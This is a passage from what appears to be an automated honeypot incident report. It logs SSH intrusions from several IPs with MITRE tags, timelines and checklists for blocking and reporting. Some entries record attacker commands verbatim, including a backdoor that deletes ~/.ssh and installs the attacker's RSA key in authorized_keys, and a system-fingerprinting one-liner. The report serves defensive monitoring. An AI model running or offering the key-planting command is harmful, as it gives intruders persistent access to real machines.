| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:50:07` | `cowrie.session.connect` |
| `2026-09-05 16:50:07` | `cowrie.client.version` |
| `2026-09-05 16:50:07` | `cowrie.client.kex` |
| `2026-09-05 16:50:07` | `cowrie.login.success` |
| `2026-09-05 16:50:08` | `cowrie.session.params` |
| `2026-09-05 16:50:08` | `cowrie.command.input` |
| `2026-09-05 16:50:08` | `cowrie.command.failed` |
| `2026-09-05 16:50:08` | `cowrie.log.closed` |
| `2026-09-05 16:50:09` | `cowrie.session.params` |
| `2026-09-05 16:50:09` | `cowrie.command.input` |
| `2026-09-05 16:50:09` | `cowrie.session.file_download` |
| `2026-09-05 16:50:09` | `cowrie.log.closed` |
| `2026-09-05 16:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.255[.]63` to AbuseIPDB if not already reported
- [ ] Block `165.154.255[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a496b5eb3a41

| Field | Detail |
|---|---|
| **Source IP** | `165.154.255[.]63` |
| **First Seen** | 2026-09-05 16:50 |
| **Last Seen** | 2026-09-05 16:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:50:09` | `cowrie.session.connect` |
| `2026-09-05 16:50:09` | `cowrie.client.version` |
| `2026-09-05 16:50:09` | `cowrie.client.kex` |
| `2026-09-05 16:50:09` | `cowrie.login.success` |
| `2026-09-05 16:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.255[.]63` to AbuseIPDB if not already reported
- [ ] Block `165.154.255[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-640562b33e23

| Field | Detail |
|---|---|
| **Source IP** | `165.154.255[.]63` |
| **First Seen** | 2026-09-05 16:50 |
| **Last Seen** | 2026-09-05 16:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:50:09` | `cowrie.session.connect` |
| `2026-09-05 16:50:09` | `cowrie.client.version` |
| `2026-09-05 16:50:09` | `cowrie.client.kex` |
| `2026-09-05 16:50:10` | `cowrie.login.success` |
| `2026-09-05 16:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.255[.]63` to AbuseIPDB if not already reported
- [ ] Block `165.154.255[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c912e25261d6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 16:50 |
| **Last Seen** | 2026-09-05 16:50 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:50:15` | `cowrie.session.connect` |
| `2026-09-05 16:50:16` | `cowrie.client.version` |
| `2026-09-05 16:50:16` | `cowrie.client.kex` |
| `2026-09-05 16:50:20` | `cowrie.login.success` |
| `2026-09-05 16:50:23` | `cowrie.session.params` |
| `2026-09-05 16:50:23` | `cowrie.command.input` |
| `2026-09-05 16:50:23` | `cowrie.command.input` |
| `2026-09-05 16:50:23` | `cowrie.command.input` |
| `2026-09-05 16:50:23` | `cowrie.command.input` |
| `2026-09-05 16:50:23` | `cowrie.command.input` |
| `2026-09-05 16:50:23` | `cowrie.command.success` |
| `2026-09-05 16:50:23` | `cowrie.command.input` |
| `2026-09-05 16:50:23` | `cowrie.command.input` |
| `2026-09-05 16:50:23` | `cowrie.command.input` |
| `2026-09-05 16:50:23` | `cowrie.command.input` |
| `2026-09-05 16:50:24` | `cowrie.log.closed` |
| `2026-09-05 16:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37ded0451740

| Field | Detail |
|---|---|
| **Source IP** | `212.64.201[.]210` |
| **First Seen** | 2026-09-05 16:51 |
| **Last Seen** | 2026-09-05 16:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:51:29` | `cowrie.session.connect` |
| `2026-09-05 16:51:29` | `cowrie.client.version` |
| `2026-09-05 16:51:29` | `cowrie.client.kex` |
| `2026-09-05 16:51:30` | `cowrie.login.success` |
| `2026-09-05 16:51:31` | `cowrie.session.params` |
| `2026-09-05 16:51:31` | `cowrie.command.input` |
| `2026-09-05 16:51:31` | `cowrie.command.failed` |
| `2026-09-05 16:51:31` | `cowrie.log.closed` |
| `2026-09-05 16:51:32` | `cowrie.session.params` |
| `2026-09-05 16:51:32` | `cowrie.command.input` |
| `2026-09-05 16:51:32` | `cowrie.session.file_download` |
| `2026-09-05 16:51:32` | `cowrie.log.closed` |
| `2026-09-05 16:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.201[.]210` to AbuseIPDB if not already reported
- [ ] Block `212.64.201[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ae69837b0ef

| Field | Detail |
|---|---|
| **Source IP** | `212.64.201[.]210` |
| **First Seen** | 2026-09-05 16:51 |
| **Last Seen** | 2026-09-05 16:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:51:32` | `cowrie.session.connect` |
| `2026-09-05 16:51:32` | `cowrie.client.version` |
| `2026-09-05 16:51:32` | `cowrie.client.kex` |
| `2026-09-05 16:51:33` | `cowrie.login.success` |
| `2026-09-05 16:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.201[.]210` to AbuseIPDB if not already reported
- [ ] Block `212.64.201[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34e3af52d2ca

| Field | Detail |
|---|---|
| **Source IP** | `212.64.201[.]210` |
| **First Seen** | 2026-09-05 16:51 |
| **Last Seen** | 2026-09-05 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:51:33` | `cowrie.session.connect` |
| `2026-09-05 16:51:33` | `cowrie.client.version` |
| `2026-09-05 16:51:33` | `cowrie.client.kex` |
| `2026-09-05 16:51:34` | `cowrie.login.success` |
| `2026-09-05 16:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.201[.]210` to AbuseIPDB if not already reported
- [ ] Block `212.64.201[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac5d54159b7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 16:53 |
| **Last Seen** | 2026-09-05 16:54 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:53:51` | `cowrie.session.connect` |
| `2026-09-05 16:53:52` | `cowrie.client.version` |
| `2026-09-05 16:53:52` | `cowrie.client.kex` |
| `2026-09-05 16:53:57` | `cowrie.login.success` |
| `2026-09-05 16:54:00` | `cowrie.session.params` |
| `2026-09-05 16:54:00` | `cowrie.command.input` |
| `2026-09-05 16:54:00` | `cowrie.command.input` |
| `2026-09-05 16:54:00` | `cowrie.command.input` |
| `2026-09-05 16:54:00` | `cowrie.command.input` |
| `2026-09-05 16:54:00` | `cowrie.command.input` |
| `2026-09-05 16:54:00` | `cowrie.command.success` |
| `2026-09-05 16:54:00` | `cowrie.command.input` |
| `2026-09-05 16:54:00` | `cowrie.command.input` |
| `2026-09-05 16:54:00` | `cowrie.command.input` |
| `2026-09-05 16:54:00` | `cowrie.command.input` |
| `2026-09-05 16:54:02` | `cowrie.log.closed` |
| `2026-09-05 16:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660e46b24834

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 16:57 |
| **Last Seen** | 2026-09-05 16:57 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:57:30` | `cowrie.session.connect` |
| `2026-09-05 16:57:31` | `cowrie.client.version` |
| `2026-09-05 16:57:31` | `cowrie.client.kex` |
| `2026-09-05 16:57:36` | `cowrie.login.success` |
| `2026-09-05 16:57:40` | `cowrie.session.params` |
| `2026-09-05 16:57:40` | `cowrie.command.input` |
| `2026-09-05 16:57:40` | `cowrie.command.input` |
| `2026-09-05 16:57:40` | `cowrie.command.input` |
| `2026-09-05 16:57:40` | `cowrie.command.input` |
| `2026-09-05 16:57:40` | `cowrie.command.input` |
| `2026-09-05 16:57:40` | `cowrie.command.success` |
| `2026-09-05 16:57:40` | `cowrie.command.input` |
| `2026-09-05 16:57:40` | `cowrie.command.input` |
| `2026-09-05 16:57:40` | `cowrie.command.input` |
| `2026-09-05 16:57:40` | `cowrie.command.input` |
| `2026-09-05 16:57:41` | `cowrie.log.closed` |
| `2026-09-05 16:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0512f686d6b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:00 |
| **Last Seen** | 2026-09-05 17:01 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:00:53` | `cowrie.session.connect` |
| `2026-09-05 17:00:55` | `cowrie.client.version` |
| `2026-09-05 17:00:55` | `cowrie.client.kex` |
| `2026-09-05 17:00:59` | `cowrie.login.success` |
| `2026-09-05 17:01:04` | `cowrie.session.params` |
| `2026-09-05 17:01:04` | `cowrie.command.input` |
| `2026-09-05 17:01:04` | `cowrie.command.input` |
| `2026-09-05 17:01:04` | `cowrie.command.input` |
| `2026-09-05 17:01:04` | `cowrie.command.input` |
| `2026-09-05 17:01:04` | `cowrie.command.input` |
| `2026-09-05 17:01:04` | `cowrie.command.success` |
| `2026-09-05 17:01:04` | `cowrie.command.input` |
| `2026-09-05 17:01:04` | `cowrie.command.input` |
| `2026-09-05 17:01:04` | `cowrie.command.input` |
| `2026-09-05 17:01:04` | `cowrie.command.input` |
| `2026-09-05 17:01:07` | `cowrie.log.closed` |
| `2026-09-05 17:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9b8c6211b39

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:04 |
| **Last Seen** | 2026-09-05 17:04 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:04:17` | `cowrie.session.connect` |
| `2026-09-05 17:04:18` | `cowrie.client.version` |
| `2026-09-05 17:04:18` | `cowrie.client.kex` |
| `2026-09-05 17:04:23` | `cowrie.login.success` |
| `2026-09-05 17:04:28` | `cowrie.session.params` |
| `2026-09-05 17:04:28` | `cowrie.command.input` |
| `2026-09-05 17:04:28` | `cowrie.command.input` |
| `2026-09-05 17:04:28` | `cowrie.command.input` |
| `2026-09-05 17:04:28` | `cowrie.command.input` |
| `2026-09-05 17:04:28` | `cowrie.command.input` |
| `2026-09-05 17:04:28` | `cowrie.command.success` |
| `2026-09-05 17:04:28` | `cowrie.command.input` |
| `2026-09-05 17:04:28` | `cowrie.command.input` |
| `2026-09-05 17:04:28` | `cowrie.command.input` |
| `2026-09-05 17:04:28` | `cowrie.command.input` |
| `2026-09-05 17:04:32` | `cowrie.log.closed` |
| `2026-09-05 17:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-545efda3b71f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:07 |
| **Last Seen** | 2026-09-05 17:07 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:07:30` | `cowrie.session.connect` |
| `2026-09-05 17:07:31` | `cowrie.client.version` |
| `2026-09-05 17:07:31` | `cowrie.client.kex` |
| `2026-09-05 17:07:35` | `cowrie.login.success` |
| `2026-09-05 17:07:39` | `cowrie.session.params` |
| `2026-09-05 17:07:39` | `cowrie.command.input` |
| `2026-09-05 17:07:39` | `cowrie.command.input` |
| `2026-09-05 17:07:39` | `cowrie.command.input` |
| `2026-09-05 17:07:39` | `cowrie.command.input` |
| `2026-09-05 17:07:39` | `cowrie.command.input` |
| `2026-09-05 17:07:39` | `cowrie.command.success` |
| `2026-09-05 17:07:39` | `cowrie.command.input` |
| `2026-09-05 17:07:39` | `cowrie.command.input` |
| `2026-09-05 17:07:39` | `cowrie.command.input` |
| `2026-09-05 17:07:39` | `cowrie.command.input` |
| `2026-09-05 17:07:41` | `cowrie.log.closed` |
| `2026-09-05 17:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd39fffa64eb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:10 |
| **Last Seen** | 2026-09-05 17:11 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:10:54` | `cowrie.session.connect` |
| `2026-09-05 17:10:57` | `cowrie.client.version` |
| `2026-09-05 17:10:57` | `cowrie.client.kex` |
| `2026-09-05 17:11:19` | `cowrie.login.success` |
| `2026-09-05 17:11:22` | `cowrie.session.params` |
| `2026-09-05 17:11:22` | `cowrie.command.input` |
| `2026-09-05 17:11:22` | `cowrie.command.input` |
| `2026-09-05 17:11:22` | `cowrie.command.input` |
| `2026-09-05 17:11:22` | `cowrie.command.input` |
| `2026-09-05 17:11:22` | `cowrie.command.input` |
| `2026-09-05 17:11:22` | `cowrie.command.success` |
| `2026-09-05 17:11:22` | `cowrie.command.input` |
| `2026-09-05 17:11:22` | `cowrie.command.input` |
| `2026-09-05 17:11:22` | `cowrie.command.input` |
| `2026-09-05 17:11:22` | `cowrie.command.input` |
| `2026-09-05 17:11:24` | `cowrie.log.closed` |
| `2026-09-05 17:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edaf5658efb9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:14 |
| **Last Seen** | 2026-09-05 17:15 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:14:51` | `cowrie.session.connect` |
| `2026-09-05 17:14:53` | `cowrie.client.version` |
| `2026-09-05 17:14:53` | `cowrie.client.kex` |
| `2026-09-05 17:14:59` | `cowrie.login.success` |
| `2026-09-05 17:15:04` | `cowrie.session.params` |
| `2026-09-05 17:15:04` | `cowrie.command.input` |
| `2026-09-05 17:15:04` | `cowrie.command.input` |
| `2026-09-05 17:15:04` | `cowrie.command.input` |
| `2026-09-05 17:15:04` | `cowrie.command.input` |
| `2026-09-05 17:15:04` | `cowrie.command.input` |
| `2026-09-05 17:15:04` | `cowrie.command.success` |
| `2026-09-05 17:15:04` | `cowrie.command.input` |
| `2026-09-05 17:15:04` | `cowrie.command.input` |
| `2026-09-05 17:15:04` | `cowrie.command.input` |
| `2026-09-05 17:15:04` | `cowrie.command.input` |
| `2026-09-05 17:15:05` | `cowrie.log.closed` |
| `2026-09-05 17:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27d02e02a1d4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:18 |
| **Last Seen** | 2026-09-05 17:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:18:43` | `cowrie.session.connect` |
| `2026-09-05 17:18:43` | `cowrie.client.version` |
| `2026-09-05 17:18:43` | `cowrie.client.kex` |
| `2026-09-05 17:18:50` | `cowrie.login.success` |
| `2026-09-05 17:18:52` | `cowrie.session.params` |
| `2026-09-05 17:18:52` | `cowrie.command.input` |
